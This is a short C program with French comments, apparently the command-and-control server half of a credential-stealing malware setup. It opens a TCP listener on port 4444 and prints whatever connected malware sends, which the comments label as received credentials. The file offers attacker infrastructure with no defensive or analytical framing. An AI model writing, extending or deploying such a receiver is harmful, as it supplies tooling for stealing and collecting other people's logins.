#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 4444  // Port d'écoute du C2

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    socklen_t addrlen = sizeof(address);
    char buffer[1024] = {0};

    // Création du socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    // Configuration de l'adresse
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Bind et écoute du socket
    bind(server_fd, (struct sockaddr*)&address, sizeof(address));
    listen(server_fd, 3);

    printf("[*] Serveur C2 en écoute sur le port %d...\n", PORT);

    // Boucle infinie pour recevoir les données des malwares connectés
    while ((new_socket = accept(server_fd, (struct sockaddr*)&address, &addrlen)) >= 0) {
        read(new_socket, buffer, 1024);
        printf("[+] Credentials Reçus : %s\n", buffer);
        close(new_socket);
    }

    return 0;
}
